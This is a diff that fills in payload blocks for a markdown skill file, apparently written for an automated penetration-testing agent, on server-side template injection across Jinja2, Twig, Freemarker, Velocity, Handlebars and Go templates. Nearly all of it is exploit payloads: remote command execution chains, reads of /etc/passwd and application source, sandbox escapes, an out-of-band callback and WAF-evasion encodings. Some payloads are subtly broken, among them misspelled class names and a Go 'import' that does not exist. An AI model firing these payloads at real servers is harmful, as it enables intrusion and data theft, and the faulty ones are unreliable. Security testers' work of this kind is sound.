@@ -1,9 +1,10 @@
-﻿---
+---
 name: ssti
 description: "Server-Side Template Injection exploitation across Jinja2, Twig, Freemarker, Velocity, Handlebars, and Go templates"
 category: specialized
 tier: powerful
 toolRefs: [httpRequest, parseResponse, evaluateRendered, updateGraph, writeFinding, encodeDecode, followRedirects, recordEvidence, getCapturedHeaders, runPrimitive]
+primitives: [sstiBlind, rceClass]
 triggers: ["server side template injection", "ssti", "template injection", "template escape", "jinja2", "twig", "freemarker", "velocity", "handlebars template", "go template injection"]
 contextBoosts: [sqli]
 mitreAttack: ["T1059.007", "T1190"]
@@ -67,9 +68,24 @@ When no output is rendered, use time-based or out-of-band detection:
 
 **Jinja2 time-based:**
 
+```jinja2
+{{requests.get('http://YOUR-OAST/?jinja2')}}
+{{config.__class__.__init__.__globals__['os'].popen('sleep 5').read()}}
+```
+
 **Freemarker time-based:**
 
+```freemarker
+<#assign ex="freemarker.template.utility.Execute"?new()>${ex("sleep 5")}
+```
+
 **Velocity time-based:**
+
+```velocity
+#set($class=$class.forName("java.lang.Runtime"))
+#set($rt=$class.getDeclaredMethod("getRuntime").invoke(null))
+$rt.exec("sleep 5")
+```
 
 ### Error-Based Detection
 
@@ -106,12 +122,21 @@ Inject syntax that triggers engine-specific errors to fingerprint:
 ### Fingerprinting via Object Inspection
 
 **Jinja2:**
+```jinja2
+{{config}}
+```
 Returns `Config` — confirms Jinja2.
 
 **Twig:**
+```twig
+{{_self.env.getExtension('Twig_Extension_Core')}}
+```
 Returns Twig extension list — confirms Twig.
 
 **Freemarker:**
+```freemarker
+${.version}
+```
 Returns Freemarker version string.
 
 ## Jinja2 / Python
@@ -120,31 +145,73 @@ Returns Freemarker version string.
 
 **Standard RCE (Flask/Jinja2):**
 
+```jinja2
+{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
+```
+
 **Alternative RCE path:**
+
+```jinja2
+{{request.application.__self__._get_data_for_json.__globals__['__builtins__']['__import__']('os').popen('id').read()}}
+```
 
 **Using cycler (Flask-specific):**
 
+```jinja2
+{% set cycler = config.__class__.__init__.__globals__['_cycler'].__init__.__globals__ %}{{cycler['os'].popen('id').read()}}
+```
+
 **Using joiner:**
 
+```jinja2
+{% set joiner = config.__class__.__init__.__globals__['_joiner'].__init__.__globals__ %}{{joiner['os'].popen('id').read()}}
+```
+
 **Using namespace:**
+
+```jinja2
+{% set ns = config.__class__.__init__.__globals__['_namespace'].__init__.__globals__ %}{{ns['os'].popen('id').read()}}
+```
 
 ### File Read/Write
 
 **Read /etc/passwd:**
 
+```jinja2
+{{config.__class__.__init__.__globals__['os'].popen('cat /etc/passwd').read()}}
+```
+
 **Read application source:**
+
+```jinja2
+{{config.__class__.__init__.__globals__['__builtins__']['open']('/app/app.py').read()}}
+```
 
 ### Sandbox Escape
 
 **Jinja2 sandboxed environment bypass (CVE-2024-22195):**
 
+```jinja2
+{{_self._joiner().os.popen('id').read()}}
+```
+
 **Attr filter bypass for sandbox:**
+
+```jinja2
+{{()|attr('__class__')|attr('__mro__')|attr('__getitem__')(2)|attr('__subclasses__')()|attr('__getitem__')(245)('id',shell=true,stdout=-1)|attr('communicate')()}}
+```
 
 ### Subclass Enumeration (Generic Python RCE)
 
+```jinja2
+{{''.__class__.__mro__.__subclasses__()}}
+```
 
 Locate `os._wrap_close` or `subprocess.Popen` in the list and invoke:
 
+```jinja2
+{{''.__class__.__mro__.__subclasses__()[X]('id',shell=True,stdout=-1).communicate()}}
+```
 
 Replace `X` with the index of the identified class.
 
@@ -154,17 +221,37 @@ Replace `X` with the index of the identified class.
 
 **Standard Twig RCE:**
 
+```twig
+{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}
+```
+
 **Alternative using _self parent:**
 
+```twig
+{{_self.env.registerUndefinedFilterCallback('system')}}{{_self.env.getFilter('id')}}
+```
+
 **Using apply filter:**
+
+```twig
+{% apply spaceless %}{{['id']|filter('system')}}{% endapply %}
+```
 
 ### File Operations
 
 **Read file via Twig:**
 
+```twig
+{{_self.env.registerUndefinedFilterCallback('file_get_contents')}}{{_self.env.getFilter('/etc/passwd')}}
+```
+
 ### Sandbox Escape
 
 **Twig sandbox escape via _self access:**
+
+```twig
+{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}
+```
 
 The `_self` variable references the current template, and its `env` property gives access to the Twig environment, bypassing sandbox restrictions if the sandbox policy allows `_self` access.
 
@@ -174,20 +261,48 @@ The `_self` variable references the current template, and its `env` property giv
 
 **Execute system command:**
 
+```freemarker
+<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
+```
+
 **Alternative using ObjectConstructor:**
+
+```freemarker
+<#assign dt="freemarker.template.utility.ObjectConstructor"?new()>${dt("java.lang.Runtime","getRuntime").exec("id")}
+```
 
 ### File Operations
 
 **Read file:**
 
+```freemarker
+<#assign ex="freemarker.template.utility.Execute"?new()>${ex("cat /etc/passwd")}
+```
+
 **List directory:**
+
+```freemarker
+<#assign ex="freemarker.template.utility.Execute"?new()>${ex("ls -la /app/")}
+```
 
 ### Sandbox Bypass
 
 If `Execute` and `ObjectConstructor` are blocked, try:
 
+```freemarker
+<#assign classloader=object.class.protectionDomain.classLoader>
+<#assign owc=classloader.loadClass("freemarker.template.ObjectWrapper")>
+<#assign dwf=classloader.loadClass("freemarker.template.DefaultObjectWrapper")>
+<#assign ec=classloader.loadClass("freemarker.template.utility.Execute")>
+${dwf.newInstance().getMethod("getOuterName").invoke(object)}
+```
 
 Or via Jython/other loaded libraries:
+
+```freemarker
+<#assign xearthworm="jython.runtime"?eval>
+<#assign xr="freemarker.template.utility.Execute"?new()>${xr("id")}
+```
 
 
 ## Velocity / Java
@@ -196,20 +311,61 @@ Or via Jython/other loaded libraries:
 
 **Standard Velocity RCE:**
 
+```velocity
+#set($class=$class.forName("java.lang.Runtime"))
+#set($rt=$class.getDeclaredMethod("getRuntime").invoke(null))
+#set($proc=$rt.exec("id"))
+$proc.waitFor()
+#set($input=$proc.getInputStream())
+#foreach($i in [1..$input.available()])$proc.getInputStream().read()#end
+```
+
 **Alternative using tools:**
 
+```velocity
+#set($str=$class.forName("java.lang.String"))
+#set($chr=$class.forName("java.lang.Character"))
+#set($ex=$class.forName("freemarker.template.utility.Execute"))
+#set($cmd=$ex.newInstance("id"))
+$cmd
+```
+
 **Using context lookup:**
+
+```velocity
+#set($proc=$runtime.exec("id"))
+#set($is=$proc.getInputStream())
+#foreach($i in [1..1024])$is.read()#end
+```
 
 ### File Operations
 
 **Read file:**
 
+```velocity
+#set($str=$class.forName("java.lang.String"))
+#set($ex=$class.forName("freemarker.template.utility.Execute"))
+${ex.newInstance("cat /etc/passwd")}
+```
+
 ### Sandbox Bypass
 
 If `$class` is restricted, try:
 
+```velocity
+#set($ct=$class.forName("org.apache.velocity.util.introspection.UberspectImpl"))
+#set($cons=$class.forName("java.lang.ProcessBuilder"))
+#set($proc=$cons.newInstance(["id"]).start())
+```
 
 Or via reflection:
+
+```velocity
+#set($field=$class.forName("java.lang.Runtime").getDeclaredField("currentRuntime"))
+$field.setAccessible(true)
+#set($rt=$field.get(null))
+$rt.exec("id")
+```
 
 
 ## Handlebars / Node.js
@@ -218,9 +374,49 @@ Or via reflection:
 
 **Prototype pollution RCE (Node.js < 4.2.0):**
 
+```handlebars
+{{#with "s" as |stringlist|}}
+  {{#with "e"}}
+    {{#with split as |conslist|}}
+      {{#with subsSS 2 3 as |c}}RCE{{/with}}
+    {{/with}}
+  {{/with}}
+{{/with}}
+```
+
 **Simplified RCE (if require is accessible):**
 
+```handlebars
+{{#each value}}
+  {{#with "bar"}}
+    {{#with "constructor"}}
+      {{#with prototype}}
+        {{#with constructor}}
+          {{#with prototype}}{{#each keys}}RCE{{/each}}{{/with}}
+        {{/with}}
+      {{/with}}
+    {{/with}}
+  {{/with}}
+{{/each}}
+```
+
 ### File Read
+
+```handlebars
+{{#each value}}
+  {{#with "bar"}}
+    {{#with "constructor"}}
+      {{#with prototype}}
+        {{#with constructor}}
+          {{#with prototype}}
+            {{#each keys}}KEY:{{@key}} {{/each}}
+          {{/with}}
+        {{/with}}
+      {{/with}}
+    {{/with}}
+  {{/with}}
+{{/each}}
+```
 
 
 ### Sandbox Bypass
@@ -233,15 +429,33 @@ Handlebars has no built-in sandbox. If `handlebars` is used with a custom `runti
 
 **Standard Go template RCE (custom FuncMap):**
 
+```go
+{{.Exec "id"}}
+```
+
+If a custom `Exec` function is registered, this executes the command directly. Otherwise enumerate exposed methods.
+
 **Using template method calls:**
+
+```go
+{{. | call .Exec "id"}}
+```
 
 ### File Operations
 
 **Read file (if file functions are exposed):**
 
+```go
+{{.Read "/etc/passwd"}}
+```
+
 ### Sandbox Bypass
 
 Go templates have no built-in sandbox, but the `text/template` and `html/template` packages restrict what methods can be called on objects. If `reflect` is available:
+
+```go
+{{$x := import "os"}}{{$x.Exec "id"}}
+```
 
 
 ## Filter Bypass Techniques
@@ -252,23 +466,59 @@ When WAFs block keyword patterns, encode payloads:
 
 **URL encoding:**
 
+```
+%7B%7B7*7%7D%7D  →  {{7*7}}
+%24%7B7*7%7D  →  ${7*7}
+%3C%25%3D%207*7%20%25%3E  →  <%= 7*7 %>
+```
+
 **Double URL encoding:**
+
+```
+%257B%257B7*7%257D%257D  →  {{7*7}}
+```
 
 **HTML entity encoding:**
 
+```
+&#123;&#123;7*7&#125;&#125;  →  {{7*7}}
+```
+
 **Unicode encoding (for Java engines):**
+
+```
+\u0024\u007b\u0037\u002a\u0037\u007d  →  ${7*7}
+```
 
 ### String Concatenation
 
 **Jinja2 string concat:**
 
+```jinja2
+{{config.__class__.__init__.__globals__['_o'+'s'].popen('id').read()}}
+```
+
 **Freemarker string concat:**
 
+```freemarker
+<#assign ex="freemeter.template.ut"+"ility.Ex"+"ecute"?new()>${ex("id")}
+```
+
 **Velocity string concat:**
+
+```velocity
+#set($chr=$class.forName("java.lang.Character"))
+#set($str=$chr.forName("java.lang.String"))
+#set($rt=$class.forName("java.lang.R"+"untime"))
+```
 
 ### Case Manipulation
 
 **Mixed case (PHP/Twig):**
+
+```twig
+{{_self.env.registerUndefinedFilterCallback('eXeC')}}{{_self.env.getFilter('id')}}
+```
 
 ### Whitespace Bypass
 
@@ -276,11 +526,23 @@ Insert tabs or newlines within keywords:
 
 **Jinja2:**
 
+```jinja2
+{{config.__class__.__init__.__globals__['o\x00s'].popen('id').read()}}
+```
+
 **Freemarker:**
+
+```freemarker
+<#assign ex="freemeter.template.utility.Exe"+"cute"?new()>${ex("id")}
+```
 
 ### Null Byte Injection
 
 Some template engines ignore null bytes:
+
+```jinja2
+{{config.__class__.__init__.__globals__['os\x00'].popen('id').read()}}
+```
 
 
 ### Alternative Class Chains
@@ -289,10 +551,22 @@ When primary chain is blocked, enumerate alternatives:
 
 **Jinja2 subclass list:**
 
+```jinja2
+{{''.__class__.__mro__[2].__subclasses__()}}
+```
+
 Count subclasses, then iterate:
 
+```jinja2
+{{''.__class__.__mro__[2].__subclasses__()[X]('id',shell=True,stdout=-1).communicate()}}
+```
 
 **Freemarker class loading:**
+
+```freemarker
+<#assign classloader=object.class.protectionDomain.classLoader>
+<#assign owc=classloader.loadClass("freemarker.template.ObjectWrapper")>
+```
 
 ### Template Engine Switching
 
@@ -314,6 +588,9 @@ URL: `?a=registerUndefinedFilterCallback&b=exec`
 
 Test multiple engines simultaneously:
 
+```jinja2
+$%7B7*7%7D  {{7*7}}  <%= 7*7 %>  #{7*7}  [[${7*7}]]
+```
 
 If output contains `49` in multiple formats, multiple engines may be processing the input.
 
@@ -361,3 +638,15 @@ First, fingerprint the engine: try each syntax variant (`{{7*7}}`, `${7*7}`, `<%
 ## Verification & Impact
 
 CONFIRMED when the raw response shows evaluated output: `49` for detection, actual file content for read, or command output containing `uid=`/`groups=` for RCE. Blind cases are CONFIRMED only with measured timing deltas or an observed OAST callback; otherwise SUSPECTED. Document impact by capability proven — information disclosure (file read), RCE (command output), or sandbox-escape context — plus engine, endpoint, parameter, and exact payload. Always attach the full request/response exchange via `recordEvidence`.
+
+## Primitive Execution
+
+The attack classes above are executable through the primitive registry. Invoke each
+primitive by its id below using the run-primitive execution tool instead of re-firing
+payloads manually; confirmed results pass through the evidence gate and commit as
+findings with exploit proofs automatically.
+
+| Primitive id | Coverage |
+|---|---|
+| `sstiBlind` | blind server-side template injection oracle |
+| `rceClass` | command-injection / RCE class probes |
